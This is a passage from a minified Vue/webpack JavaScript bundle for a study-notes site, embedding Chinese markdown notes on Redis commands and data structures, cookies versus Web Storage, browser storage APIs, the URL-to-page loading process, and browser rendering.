incrby、decrby、incrbyfloat\r\n- append key value: 追加值\r\n- strlen key: 字符串长度\r\n- getset: 设置并返回原值\r\n- setrange key offeset value: 设置指定位置的字符\r\n- getrange key start end：获取部分字符串\r\n\r\n### 哈希\r\n\r\n- hset key field value：\t设置值\r\n- hget key field:\t获取值\r\n- hdel key field [field ...]:\t\t删除field\r\n- hlen key:\t计算field个数\r\n- hmget key field [field ...]:\t批量获取\r\n- hmset key field [field value ...]:\t批量设置\r\n- hexists key field:\t\t检查field是否存在\r\n- hkeys key:\t\t获取所有field\r\n- hvals key：\t\t获取所有value\r\n- hgetall key:\t\t获取所有field-value\r\n- hincrby key field、hincrbyfloat key field\r\n- hstrlen key field:\t\t计算value的字符串长度\r\n\r\n### 列表\r\n\r\n- 添加\r\n\r\n\t- rpush key value [value...]:\t从右边插入元素\r\n\t- lpush key value [value...]:\t从左边插入元素\r\n\t- linsert key before/after pivot value:\t在值为pivot的前面或后面插入元素\r\n\r\n- 查找\r\n\r\n\t- lrange key start end:\t获取指定范围内的元素列表\r\n\t- lindex key index:\t获取列表指定索引下标的元素\r\n\t- llen key:\t获取列表长度\r\n\r\n- 删除\r\n\r\n\t- lpop key:\t从列表左侧弹出元素\r\n\t- rpop key:\t从列表右侧弹出元素\r\n\t- lrem  key count value:\t删除值等于value的元素\r\n\r\n\t\t- count>0:\t从左到右，删除最多count个元素\r\n\t\t- count<0:\t从右往左，删除最多count绝对值个元素\r\n\t\t- count=0:\t删除所有元素\r\n\r\n\t- ltrim key start end:\t按照索引范围修剪列表\r\n\r\n- 修改\r\n\r\n\t- lset key index newValue:\t修改指定索引下标的元素\r\n\r\n- 阻塞\r\n\r\n\t- blpop/brpop key [key...] timeout\r\n\r\n\t\t- 列表为空\r\n\r\n\t\t\t- timeout=n:\tn秒后返回\r\n\t\t\t- timeout=0\r\n\r\n\t\t\t\t- 客户端一直阻塞\r\n\t\t\t\t- 如果列表有值插入则立即返回\r\n\r\n\t\t- 列表非空\r\n\r\n\t\t\t- 客户端立即返回\r\n\r\n\t\t- brpop两点注意\r\n\r\n\t\t\t- 多个键，brpop会从左往右遍历键，一旦有一个键能弹出元素，客户端立即返回\r\n\t\t\t- 多个客户端对一个键执行brpop，最先执行brpop命令的客户端可以获取到弹出的值\r\n\r\n### 集合\r\n\r\n- sadd key member [...member]:\t添加元素\r\n- srem key member [...member]:\t删除元素\r\n- sismember key member:\t判断是否为集合元素\r\n- scard key:\t计算集合大小\r\n- srandmember key [count]:\t随机返回count个元素\r\n- spop key [count]:\t随机弹出count个元素\r\n- smembers key: 返回集合所有元素\r\n- sinter key [key...]:\t返回多个集合交集\r\n- sunion key [key...]:\t返回多个集合并集\r\n- sdiff key [key...]:\t返回多个集合差集\r\n- sinterstore/sunionstore/sdiffstore destination key [...key]:\t将返回的集合存储在destination中\r\n\r\n### 有序集合\r\n\r\n- zadd key [NX|XX] [CH] [INCR] score member [...score member]:\t添加元素\r\n\r\n\t- NX: 添加\r\n\t- XX：更新\r\n\t- CH：返回这次操作后发生变化的个数\r\n\t- INCR：对score做增加\r\n\r\n- zrem key member [...member]:\t删除元素\r\n- zcard key:\t计算有序集合大小\r\n- zscore key member:\t返回某个元素的分数\r\n- zrank/zrevrank key member:\t返回某个元素的排名(升序、降序)\r\n- zincrby key increment member:\t增加成员分数\r\n- zrange/zrevrange key start end:\t返回指定排名（升序、降序）范围内的元素\r\n- zrangebyscore/zrevrangebyscore key mix max:\t返回指定分数（升序、降序）范围内的元素\r\n- zcount key min max:\t返回指定分数范围成员个数\r\n- zremrangebyrank key start end:\t删除指定排名内的升序元素\r\n- zremrangebyscore key min max:\t删除指定分数范围内的元素\r\n- zinterstore destination numkeys key [...key] [weights weight [...weight]] [aggrerate sum|min|max]:\t交集\r\n- zunionstore destination numkeys key [...key] [weights weight [...weight]] [aggrerate sum|min|max]:\t\t并集\r\n\r\n## 核心\r\n\r\n### Redis\r\n\r\n- 单线程模型\r\n\r\n\t- 请求\r\n\r\n\t\t- 步骤\r\n\r\n\t\t\t- 发送命令\r\n\t\t\t- 执行命令\r\n\t\t\t- 返回结果\r\n\r\n\t\t- 重点\r\n\r\n\t\t\t- 一条命令从客户端达到服务端不会立刻被执行， 所有命令都会进入一个队列中，然后逐个执行。\r\n\r\n- 单线程为什么可以这么快\r\n\r\n\t- 纯内存访问\r\n\t- 非阻塞I/O，Redis使用epoll作为I/O多路复用技术的实现，加上Redis自身的时间处理模型（Redis Event Loop）\r\n\t- 避免线程切换和静态条件的消耗\r\n\r\n## 数据结构\r\n\r\n### 字符串\r\n\r\n- 内部编码\r\n\r\n\t- int：\t8个字节的长整型\r\n\t- embstr：小于等于39个字节的字符串\r\n\t- raw：大于39个字节的字符串\r\n\r\n- 使用场景\r\n\r\n\t- 缓存：Redis作为缓存层，MySQL作为存储层。\r\n\r\n\t\t- 加速读写和降低后端压力的作用\r\n\r\n\t- 计数：使用Redis作为计数的基础工具。\r\n\r\n\t\t- 实现快速计数、查询缓存且数据可以异步落地到其他数据源\r\n\r\n\t- 共享Session：使用Redis将用户的Session集中管理。\r\n\r\n\t\t- 出于负载均衡的考虑，分布式服务会将用户的访问均衡到不同服务器，用户每刷新一次就有可能发现需要重新登录\r\n\r\n\t- 限速：限制用户单位时间内访问次数\r\n\r\n### 哈希\r\n\r\n- 内部编码\r\n\r\n\t- ziplist(压缩表)\r\n\t- hashtable（哈希表）\r\n\r\n- 使用场景\r\n\r\n\t- 缓存用户信息\r\n\r\n### 列表\r\n\r\n- 内部编码\r\n\r\n\t- ziplist\r\n\t- linkedlist\r\n\r\n- 使用场景\r\n\r\n\t- 消息队列\r\n\r\n\t\t- 生产者使用lpush从列表左侧插入元素，消费者使用brpop命令阻塞式的‘抢’列表尾部的元素\r\n\r\n\t- 文章列表\r\n\r\n\t\t- 存储用户文章列表，分页获取文章\r\n\r\n### 集合\r\n\r\n- 内部编码\r\n\r\n\t- intset:\r\n\t- hashtable:\r\n\r\n- 使用场景\r\n\r\n\t- 用户标签\r\n\r\n### 有序集合\r\n\r\n- 内部编码\r\n\r\n\t- ziplist\r\n\t- skiplist\r\n\r\n- 使用场景\r\n\r\n\t- 排行榜系统\r\n\r\n",Ln={data:function(){return{MainComponent:Rn}}},On=Ln,An=Object(u["a"])(On,jn,Mn,!1,null,"dd80896e",null),In=An.exports,Dn={mixins:[gn["a"]],components:{m1:Cn,m2:In},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"Redis基础",value:"m1"},{label:"Redis",value:"m2"}]}}},Pn=Dn,Nn=Object(u["a"])(Pn,yn,fn,!1,null,"bd497176",null),qn=Nn.exports,Hn={mixins:[gn["a"]],components:{m1:Sn,m2:qn},data:function(){return{tab:"m1",tab_level:1,tabs:[{label:"mysql",value:"m1"},{label:"redis",value:"m2"}]}}},Bn=Hn,Fn=Object(u["a"])(Bn,e,a,!1,null,"1a22cb9a",null);r["default"]=Fn.exports},"44af":function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},a=[],i=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},s=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("br"),t("a",{attrs:{href:"https://www.infoq.cn/article/event-tracking-in-zhihu"}},[n._v("数据埋点太难！知乎的做法有何可借鉴之处")]),t("br"),t("a",{attrs:{href:"https://github.com/Meituan-Dianping/Logan"}},[n._v("美团 Logan")])])}],o={},l=o,c=t("2877"),p=Object(c["a"])(l,i,s,!1,null,"199185c0",null),u=p.exports,m=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},d=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("a",{attrs:{href:"http://caibaojian.com/some-fe"}},[n._v("http://caibaojian.com/some-fe")]),t("br"),t("a",{attrs:{href:"https://www.jianshu.com/p/91cf0071c1f6"}},[n._v("https://www.jianshu.com/p/91cf0071c1f6")])])}],g={},b=g,v=Object(c["a"])(b,m,d,!1,null,"2152820d",null),h=v.exports,S=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},y=[],f={},_=f,x=Object(c["a"])(_,S,y,!1,null,"486cbcb2",null),w=x.exports,E=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},T=[],k={},C=k,j=Object(c["a"])(C,E,T,!1,null,"9c54ee30",null),M=j.exports,R=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},L=[],O={},A=O,I=Object(c["a"])(A,R,L,!1,null,"f03d1fae",null),D=I.exports,P=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},N=[],q={},H=q,B=Object(c["a"])(H,P,N,!1,null,"5ded576a",null),F=B.exports,U=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},J=[],z={},W=z,$=Object(c["a"])(W,U,J,!1,null,"33f93eab",null),G=$.exports,V=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Q=[],K={},X=K,Y=Object(c["a"])(X,V,Q,!1,null,"0a0525ec",null),Z=Y.exports,nn=t("1b62"),rn={mixins:[nn["a"]],components:{m1:u,m2:h,m3:w,m4:M,m5:D,m6:F,m7:G,m8:Z},data:function(){return{tab:"m1",tab_level:1,tabs:[{label:"未开发",value:"m1"},{label:"未开发",value:"m2"},{label:"未开发",value:"m3"},{label:"未开发",value:"m4"},{label:"未开发",value:"m5"},{label:"未开发",value:"m6"},{label:"未开发",value:"m7"},{label:"未开发",value:"m8"}]}}},tn=rn,en=Object(c["a"])(tn,e,a,!1,null,"6aac2cbe",null);r["default"]=en.exports},"5bc4":function(n,r,t){},"740a":function(n,r,t){"use strict";var e=t("5bc4"),a=t.n(e);a.a},"7b7b":function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},a=[],i=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"q-mx-lg"},[t(""+n.tab,{tag:"component"})],1)])},s=[],o=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},l=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("pre",[n._v("          搜索：机器码，电流开关与存储关系，字节码，内存和机械存储（ram，rom），堆栈，内存缓冲区，汇编语言，低级语言，高级语言，解释执行，编译执行，web发展历史，\n流程控制语句，数据类型，数据结构，操作系统，虚拟机，浏览器内核区别，webAPP，原生应用，服务器，物理机，集群，cdn，dns，tcp，http，dtd，\n\n一二：\n（概念性，不深入。个人接受能力。）\n(现阶段，自认为)\n学习方法：类比，逻辑思维能力。概观 与 盲人摸象\n 技术：\nDTD\nXml\nnode type\n浏览器渲染机制\n（html tree +  css tree => render tree =>layout =>painting ->{reflow repaint}）\n \n表现：一切皆为块。（1px -> html 油画，层叠）\n结构：树，对象。\n \n数据结构\n树状结构\n \n消息驱动，事件驱动和数据驱动\n \n结构，管道\n面向结构编程\n面向过程编程\n面向对象编程\n面向接口编程\n \n适度封装，抽象提取\n（插件：预留 API ）\n \n类数组\n （char ,string）(dom)\n\nES6\nhttp://es6.ruanyifeng.com\n（set map … 正则 fill object.assign repeat ）\n(理解： proxy  iterator 异步 模块) （单线程 和异步 promise）\n延伸：（从字节码到高级语言）\n\n其他：\n数据可视化，JQUI, 淘宝移动端适配，VW布局 ，模板，\nnginx,sourcetree,filezila\n调试 :json  mock e2e ,es6 \n \n单页应用开发\n理解 ： 单文件状态管理  MVC MVVM  \n MVC MVVM : 虚拟DOM  节点 diff （angular 脏检查 遍历所有 diff） innerHtml\nwatcher\n组件 （object.defineproperty getter setter）\n 全局注册， 变量挂载， 命名空间 （NG） \n订阅  分发 \nVuecli+ vueRouter+ vuex  ：  loader,编译， 热刷新，热加载，内存\nElementui  mint ui  // vux\n讲解：企业级 代码结构\n\n\n最后搜索ansi，utf-8，万国码，mvc，mvvm，api，模板，包管理，懒加载，热刷新，und，pwa，spa，ssr，响应式原理\n\n      ")])])}],c={},p=c,u=t("2877"),m=Object(u["a"])(p,o,l,!1,null,"063a095b",null),d=m.exports,g=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},b=[],v="# 存储\r\n## 【Cookie】说说 Cookie 与 Web Storage 的区别\r\n### Cookie\r\n- （1）什么是 Cookie？ - （1）cookie 是指某些网站为了辨别用户身份而存储在用户本地终端上的数据（通常经过加密）。 - （2）cookie 是存储于访问者的计算机中的变量。每当同一台计算机通过浏览器请求同一个页面时，就会发送这个 cookie 。 - （3）通俗的说就是当一个用户通过 HTTP 协议访问一个服务器的时候，这个服务器会将一些 key/Value 键值对返回给客户端浏览器，并给这些数据加上一些限制条件，在条件符合时这个用户下次访问这个服务器的时候，数据又被完整的带回给服务器。 - （4）cookie 是浏览器提供的一种机制，可以由 Javascript 对其进行控制，而不是 javascript 本身的性质。\r\n- （2）HTTP 无状态 - HTTP 协议是无状态的协议。一旦数据交换完毕，客户端与服务器的连接就会关闭，再次交换数据需要建立新的连接。这就意味着服务器无法从连接上跟踪会话。 - 而 cookie 机制采用的是在客户端保持状态的方案，而 session 机制采用的是在服务器端保持状态的方案。\r\n- （3）Cookie 的不可跨域名性 - cookie 是存于用户硬盘的一个文件，这个文件通常对应于一个域名。cookie 可以跨越同一个域名下的多个网页，但不能跨越多个域名使用。\r\n- （4）Cookie 的缺点 - 1.Cookie 体积过大会造成请求和响应速度变慢。 - 2.默认浏览器会任何请求都把 cookie 带上去，哪怕是静态资源。 - 3.Cookie 可以在前后端修改，数据容易篡改或伪造。 - 4.Cookie 对于敏感数据的保护基本是无效的。 - 5.有些用户是禁用掉 cookie 的\r\n### Session\r\n- 除了 cookie，web 应用程序中还经常使用 session 来记录客户端的登录状态。不同于 cookie，session 保存在服务器上。session 相当于程序在服务器上建立一份客户档案，客户来访时只需要查询客户档案表就可以了。\r\n### WebStorage\r\n- 定义与引入原因 - WebStorage 是 HTML5 中本地存储的解决方案之一，在 html5 中的 WebStorage 概念引入并不是为取代 cookie 而制定的标准，cookie 作为 HTTP 协议的一部分用来处理客户端和服务器通信是不可或缺的， session 正是依赖于实现的客户端状态保持。 - WebStorage 的意图在于解决本地本来不应该用 cookie 做，却不得不用 cookie 的本地存储。\r\n- WebStorage 的优势 - （1）从容量上讲 WebStorage 一般浏览器提供 5M 的存储空间。 - （2）安全性上 WebStorage 并不作为 HTTP header 发送的浏览器，所以相对安全。 - （3）从流量上讲，因为 WebStorage 不传送到服务器，所以不必要的流量可以节省。\r\n- Local Storage 与 Session Storage 的区别 - Session Storage - 用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此 sessionStorage 不是一种长久化的本地存储，仅仅是会话级别的存储。 - Local Storage - 除非主动删除数据，否则数据是永远不会过期的。\r\n### Cookie 和 Session 的区别\r\n- session 保存在服务器，客户端不知道其中的信息；cookie 保存在客户端，服务器能够知道其中的信息。\r\n- session 中保存的是对象，cookie 中保存的是字符串。\r\n- session 不能区分路径，同一个用户在访问一个网站期间，所有的 session 在任何地方都可以访问到。而 cookie 中如果设置了路径参数，那么同一个网站不同路径下的 cookie 互相是不可以访问的。\r\n- cookie 不是很安全，本人可以分析存放在本地的 COOKIE 并进行 COOKIE 欺骗\r\n- session 会在一定时间内保存在服务器上。当访问增多，会占用你服务器的性能。考虑到减轻服务器性能方面，应该使用 COOKIE。\r\n- 单个 cookie 保存的数据不能超过 4k ，很多浏览器都限制一个站点最多保存 20 个 cookie。\r\n- session 是通过 cookie 来工作的。\r\n### Cookie 与 Web Storage 的区别\r\n- 共同点： - 都是保存在浏览器端，且同源的。\r\n- 区别： - （1）是否在请求中携带 - cookie 数据始终在同源的 http 请求中携带（即使不需要），即 cookie 在浏览器和服务器间来回传递。而 sessionStorage 和 localStorage 不会自动把数据发给服务器，仅在本地保存。 - （2）cookie 数据还有路径（path）的概念，可以限制 cookie 只属于某个路径下。 - （3）存储大小限制也不同 - cookie 数据不能超过 4k，同时因为每次 http 请求都会携带 cookie，所以 cookie 只适合保存很小的数据，如会话标识。sessionStorage 和 localStorage 虽然也有存储大小的限制，但比 cookie 大得多，可以达到 5M 或更大。 - （4）数据有效期不同 - sessionStorage：仅在当前浏览器窗口关闭前有效，自然也就不可能持久保持； - localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据； - Cookie：只在设置的 cookie 过期时间之前一直有效，即使窗口或浏览器关闭。 - （5）作用域不同 - sessionStorage 不在不同的浏览器窗口中共享，即使是同一个页面； - localStorage 在所有同源窗口中都是共享的； - Cookie 也是在所有同源窗口中都是共享的。 - （6）Web Storage 支持事件通知机制，可以将数据更新的通知发送给监听者。 - （7）Web Storage 的 api 接口使用更方便。\r\n## 浏览器数据持久化存储\r\n### HTTP 文件缓存\r\n### LocalStorage\r\n- html5 的一种本地缓存方案，主要用于浏览器端保存体积较大的数据\r\n- 在不同浏览器中有长度限制且各不相同\r\n- 单个域名下 localStorage 的大小是有限制的，但是可以用 iframe 的方式使用多个域名来突破单个页面下 localtorage 存储数据的最大限制。\r\n- 使用浏览器多个标签页打开同个域名时，localStorage 内容一般是共享的。\r\n- 设置 localStorage 存储记录：localStorage.setItem(key, value)\r\n- 获取 localStorage 存储记录：localStorage.getItem(key)\r\n- 删除该域名下单条 localStorage 存储记录：localStorage.removeItem(key)\r\n- 删除该域名下所有 localStorage 存储记录：localStorage.clear()\r\n### SessionStorage\r\n- sessionStorage 在浏览器关闭时会自动清空，不能进行客户端的持久化数据存储。\r\n- sessionStorage 的 API 和 localStorage 完全相同\r\n### indexDB\r\n- 一个可在客户端存储大量结构化数据并且能在这些数据上使用索引进行高性能检索的一套 API\r\n### WebSQL\r\n- 浏览器端用于存储较大量数据的缓存机制，只有较新版本的 Chrome 浏览器支持该机制，并以一个独立浏览器端数据存储规范的形式出现。\r\n- WebSQL 数据库 API 实际上不是 HTML5 规范的组成部分，目前只是一种特定的浏览器特性，而且 WebSQL 在 HTML5 之前就已经存在，是单独的规范。\r\n- WebSQL 将数据以数据库二维表的形式存储在客户端，可以根据需要使用 JavaScript 去读取。\r\n- WebSQL 与其他存储方式的区别：localStorage 和 Cookie 以键值对的形式存在，WebSQL 为了更便于检索，允许 SQL 语句的查询。\r\n- WebSQL 可以让浏览器实现小型数据库存储功能，而且使用的数据库是集成在浏览器里面的。\r\n- openDatabase()方法可以打开已经存在的数据库，不存在则创建\r\n  openDatabase()中的五个参数分别为数据库名、版本号、描述、数据库大小、创建回调（即使创建回调为 null 也可以创建数据库）\r\n- transaction()方法允许根据情况控制执行事务提交或回滚\r\n- executeSql()用于执行真实的 SQL 查询语句\r\n### Cookie\r\n- 网站为了辨别用户身份或 Session 跟踪而存储在用户浏览器端的数据\r\n- Cookie 信息一般会通过 HTTP 请求发送到服务器端\r\n- 一条 Cookie 记录主要由键、值、域、过期时间和大小组成，一般用于保存用户的网站认证信息\r\n- 浏览器端通过 document.cookie 来获取 cookie\r\n### CacheStorage\r\n- cacheStorage 是在 ServiceWorker 规范中定义的，可用于保存每个 ServiceWorker 声明的 Cache 对象，是未来可能用来代替 Application Cache 的离线方案。\r\n- caches.has()检查如果包含 Cache 对象，则返回一个 promise 对象\r\n- caches.open() 打开一个 Cache 对象，并返回一个 promise 对象\r\n- caches.delete()删除 Cache 对象，成功则返回一个 promise 对象，否则返回 false\r\n- caches.keys()含有 keys 中字符串的任意一个，则返回一个 promise 对象\r\n- caches.match()匹配 key 中含有该字符串的 cache 对象，返回一个 promise 对象\r\n### Application Cache\r\n- Application Cache 是一种允许浏览器通过 manifest 配置文件在本地有选择性地存储 JavaScript、CSS、图片等静态资源的文件级缓存机制。当页面不是首次打开时，通过一个特定的 manifest 文件配置描述来选择读取本地 Application Cache 里面的文件。\r\n- 离线浏览。通过 manifest 配置描述来读取本地文件，用户可在离线时浏览完整的页面内容。\r\n- 快速加载。由于缓存资源为本地资源，因此页面加载速度较快。\r\n- 服务器负载小。只有在文件资源更新时，浏览器才会从服务器端下载，这样就减小了服 务器资源请求的压力\r\n",h={data:function(){return{MainComponent:v}}},S=h,y=Object(u["a"])(S,g,b,!1,null,"0bc7c404",null),f=y.exports,_=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},x=[],w="#### 从输入 URL 到获取页面的过程\r\n\r\n#### 正文之前\r\n\r\n> 最近正好在学习计算机网络，先整理个最入门，但是包含很多知识点的问题 —— 从输入域名或 URL 到获取页面，究竟经历了什么。把这个问题弄懂，也就代表着我们可以初步地明白**网上冲浪**是如何进行的的\r\n>\r\n> 这个过程，如果要概括，也就几句话的事，但是其中包含的知识点还是比较多的：\r\n>\r\n> 1. 域名、URL 和 URI\r\n> 2. 域名 和 IP 地址\r\n> 3. DNS 查询\r\n> 4. TCP 连接建立\r\n> 5. HTTP 请求与响应\r\n> 6. TCP 连接关闭\r\n> 7. 服务器渲染页面\r\n>\r\n> 这篇文章讲述 1、2、3、5 四个部分，关于 TCP 的部分，由于篇幅较大，需要另起一篇文章\r\n\r\n#### 正文\r\n\r\n#### 1. 域名、URL 和 URI\r\n\r\n首先要搞清楚这两个概念，**域名**，是一台计算机，或一组计算机在**网络上**的名称。**Domain Name**，顾名思义，Domain 代表着你的计算机，或者你的计算机组，**Name** 就代表着名称\r\n\r\n关于 URL(Uniform Resource Locator) 和 URI(Uniform Resource Identifier)，这两者都是用于定位资源的，区别就是：URI 是统一资源标志符，单凭 URI 就能够精准定位某个资源（比如用身份证号就能够识别中国的每一个居民），而 URL，是统一资源定位符，就是有考虑范围的资源（比如身份证号的前六位，就是根据地区来分的）\r\n\r\n举个例子：据说全中国有 29 万个张伟，那么，除了用身份证号来确定是哪一个张伟，还能怎么判断呢？这时候就需要划分地区了，比如福建省福州市的张伟，这时候可能还是有好多个张伟，那就加上比如 xxxx 年 xx 月 xx 日出生的张伟，如果这时候还能有重复，那就再加上一些其他条件（学历，政治面貌等等），就能够定位到具体的某一个张伟了，这些条件组合在一起，就是一条 URL\r\n\r\nURL 是 URI 的一个子集，每条 URL 都能够定位到一个独一无二的资源，它符合 URI 的定义，但是 URL != URI，这一点需要记清楚\r\n\r\n现在回到网页上，域名只是网站的入口（比如说主页），如果你要在这主页上点击一个链接，进行页面跳转，就需要靠 URL 来指定资源的位置，这样才能获取，如果 URL 无效，就会弹出 **404 Not Found**，比如你进入 https://cn.bing.com/，这时候就是依据域名来找到主页，然后你搜索张伟，就会有一条挺长的 URL 来跳转到搜索结果页面\r\n\r\n#### 2. 域名 和 IP 地址\r\n\r\n前面说到，域名是计算机或计算机组在网络上的名称，但是并不是每一台计算机都有绑定了域名，但是，每一台**接入网络**的计算机都有一个 IP 地址 (Internet Protocol address)，用这个 IP 地址就能够定位到一台服务器，或一组服务器，如果服务器没有绑定域名，只要有它的 IP 地址，还是可以进行访问的\r\n\r\n我们在上网时，如果要直接访问某个网站，都是输入域名就可以了，但是在定位服务器时，都是要靠 IP 地址来进行的，从域名到 IP 地址，这二者的转换就引出了一个新的概念 —— DNS(Domain Name System)\r\n\r\n当我们输入域名时，浏览器会根据这个域名在浏览去缓存的 IP 地址中去查找，如果找不到，就到 OS 中去查找缓存的 IP 地址，如果还是找不到，就会去 ISP（Internet service provider），也就是运营商（电信，铁通之类的）的服务器里查找，如果还是找不到，就要去根域名服务器查找\r\n\r\n关于运营商域名服务器以及根域名服务器的 IP 地址，在你电脑的网络设置里可以看到：\r\n\r\nDNS 服务器里有两个 IP 地址，一个是中国电信的 (ISP)，一个是位于美国的服务器（根域名服务器）\r\n\r\n另外，关于 DNS 缓存，每一次的查询，都会缓存下来，先说浏览器缓存，这里以 Chrome 为例，输入 **chrome://net-internals/#dns** 就会得到 Chrome 的 DNS 缓存。然后是 OS 的缓存，在命令行中输入 **ipconfig /displaydns** 就会得到 OS 中的缓存：\r\n\r\n#### 3. DNS 查询\r\n\r\n在说 DNS 查询之前，需要先说一下域名服务器的种类，有根服务器、顶级域名服务器、权威域名服务器和本地域名服务器\r\n\r\n在 DNS 查询的时候，首先查询本地域名服务器，也就是 ISP 提供的 DNS 服务器，如果找不到，这时候就有两种查询方式：\r\n\r\n1. 递归查询 客户端发出请求，本地 DNS 服务器代替客户端去查询其它 DNS 服务器，然后由本地 DNS 返回最终结果给客户端\r\n2. 迭代查询 本地 DNS 服务器并不能返回完整的结果，它只能给你一部分信息（比如它只知道要去 yyy 服务器上才找得到 xxx），然后又带着这个信息去 yyy 服务器上查找\r\n\r\n手绘一张草图，意思一下：\r\n\r\n至于 DNS 解析，上面介绍的只是最基本的知识，关于 DNS，还会另起一篇文章来说明\r\n\r\n#### 4. TCP 连接建立\r\n\r\n在找到目标服务器的 IP 地址之后，就要开始通信了，既然是通信，就要双方消息同步（如果双方说话都不在一个频道，这不能叫通信），这里就要引出另一个应用层协议 —— TCP(Transmission Control Protocol)，传输控制协议\r\n\r\nTCP 是基于连接的 —— 在通信开始之前建立连接，结束时断开连接\r\n\r\n#### 5. HTTP 请求与响应\r\n\r\n连接建立之后，就可以开始传输了，采用 Http 协议，这里简单分析一下 Http 请求和响应的报文：\r\n\r\nHttp 请求报文，一共有 4 个部分（包含一个空行）：\r\n\r\n**1. 请求行 (request-line)**\r\n\r\n请求行包含了请求的方法，资源的位置，以及协议的版本，举个例子：\r\n\r\n```\r\nGET /index.html HTTP/1.1\r\n```\r\n\r\n采用 GET 的方式，请求得到 index.html 这个页面，采用 HTTP/1.1 版本的协议\r\n\r\n**2. 请求头部 (headers)**\r\n\r\n头部是有多个 Key-Value 组成的，常见的有：\r\n\r\n```\r\nAccept:xxx （接受的数据类型）\r\nAccept-Charset:xxx （接受的编码格式）\r\nAccept-Language:xxx （接受的语言）\r\nUser-Agent:xxx （浏览器类型）\r\nCookie:xxx=yyy （所使用的 Cookie）\r\nConnection:close/keep-alive （连接状态：关闭/保持连接）\r\n......\r\n```\r\n\r\n**3. 空行 (blank line)**\r\n\r\n这个空行是一定要有的，它是用来区分请求头部和请求数据的，它代表着不再有头部的 Key-Value 键值对，接下来是请求数据了\r\n\r\n**4. 请求数据 (request-body)**\r\n\r\n请求主体一般是用于 POST 方法提交数据，例如最常见的表单提交，就是在请求主体写入 `Content-Type= multipart/form-data``\r\n\r\nHttp 响应报文，也是分为 4 个部分（包含一个空行）：\r\n\r\n**1. 状态行 (status-line)**\r\n\r\n状态行中包含着协议版本，状态码以及文本描述，状态码和文本描述就代表了服务器所返回的响应结果是怎样的，这里给出大致的描述：\r\n\r\n```\r\n2XX：成功\r\n3XX：重定向\r\n4XX：客户端错误\r\n5XX：服务器错误\r\n```\r\n\r\n最常见的就是：200 (OK) 和 404 (Not Found) 了\r\n\r\n**2. 响应头部 (headers)**\r\n\r\n与请求头部类似，也是 Key-Value 键值对的组合\r\n\r\n**3. 空行 (blank line)**\r\n\r\n用来分隔响应头部和响应正文\r\n\r\n**4. 响应正文**\r\n\r\n响应正文中，如果之前请求的是数据，就返回数据，如果请求的是网页，就返回 HTML 代码\r\n\r\n#### 6. TCP 连接关闭\r\n\r\n在通信结束之后，需要将连接关闭，这时候就是 TCP 四次挥手的场景了\r\n\r\n从输入 URL 到获取页面的过程，看上去就短短几个步骤，其中涵盖的知识点还是挺多的，接下来就是 TCP 的三握四挥以及状态转换图的文章了\r\n\r\n------\r\n\r\n#### 浏览器渲染原理与过程\r\n\r\n#### 浏览器如何渲染网页\r\n\r\n要了解浏览器渲染页面的过程，首先得知道一个名词——关键渲染路径。关键渲染路径是指浏览器从最初接收请求来的HTML、CSS、javascript等资源，然后解析、构建树、渲染布局、绘制，最后呈现给客户能看到的界面这整个过程。\r\n用户看到页面实际上可以分为两个阶段：页面内容加载完成和页面资源加载完成，分别对应于`DOMContentLoaded`和`Load`。\r\n\r\n- `DOMContentLoaded`事件触发时，仅当DOM加载完成，不包括样式表，图片等\r\n- `load`事件触发时，页面上所有的DOM，样式表，脚本，图片都已加载完成\r\n\r\n浏览器渲染的过程主要包括以下五步：\r\n\r\n1. 浏览器将获取的HTML文档解析成DOM树。\r\n2. 处理CSS标记，构成层叠样式表模型CSSOM(CSS Object Model)。\r\n3. 将DOM和CSSOM合并为渲染树(`rendering tree`)将会被创建，代表一系列将被渲染的对象。\r\n4. 渲染树的每个元素包含的内容都是计算过的，它被称之为布局`layout`。浏览器使用一种流式处理的方法，只需要一次绘制操作就可以布局所有的元素。\r\n5. 将渲染树的各个节点绘制到屏幕上，这一步被称为绘制`painting`。\r\n\r\n需要注意的是，以上五个步骤并不一定一次性顺序完成，比如DOM或CSSOM被修改时，亦或是哪个过程会重复执行，这样才能计算出哪些像素需要在屏幕上进行重新渲染。而在实际情况中，JavaScript和CSS的某些操作往往会多次修改DOM或者CSSOM。\r\n\r\n#### 浏览器渲染网页的具体流程\r\n\r\n#### 构建DOM树\r\n\r\n当浏览器接收到服务器响应来的HTML文档后，会遍历文档节点，生成DOM树。\r\n需要注意以下几点：\r\n\r\n- DOM树在构建的过程中可能会被CSS和JS的加载而执行阻塞\r\n- `display:none`的元素也会在DOM树中\r\n- 注释也会在DOM树中\r\n- `script`标签会在DOM树中\r\n\r\n无论是DOM还是CSSOM，都是要经过`Bytes→characters→tokens→nodes→objectmodel`这个过程。\r\n\r\n当前节点的所有子节点都构建好后才会去构建当前节点的下一个兄弟节点。\r\n\r\n#### 